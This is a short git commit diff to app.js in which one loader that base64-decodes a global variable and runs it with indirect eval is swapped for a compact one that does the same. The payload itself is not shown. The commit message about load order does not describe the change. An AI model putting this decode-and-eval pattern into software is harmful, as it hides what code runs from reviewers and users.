c4cd01a6ac4951b66f44ea07941960c5cf544ff3
nguyenxuandat20091985-rgb <nguyenxuandat20091985@gmail.com>
2026-09-25 09:05:53 +0700

    fix: restore working tree app + features extension load order

--- app.js
+++ app.js
@@ -1,8 +1,1 @@
-(function(){
-  var p=window.__B38||[];
-  if(!p.length){console.error('B38 missing');return;}
-  var bin=atob(p.join(''));
-  var bytes=new Uint8Array(bin.length);
-  for(var i=0;i<bin.length;i++) bytes[i]=bin.charCodeAt(i);
-  (0,eval)(new TextDecoder('utf-8').decode(bytes));
-})();
+(function(){var b=window.__R||"";if(!b){alert("Loi app - thieu ma nguon");return;}var bin=atob(b);var u=new Uint8Array(bin.length);for(var i=0;i<bin.length;i++)u[i]=bin.charCodeAt(i);(0,eval)(new TextDecoder().decode(u));})();
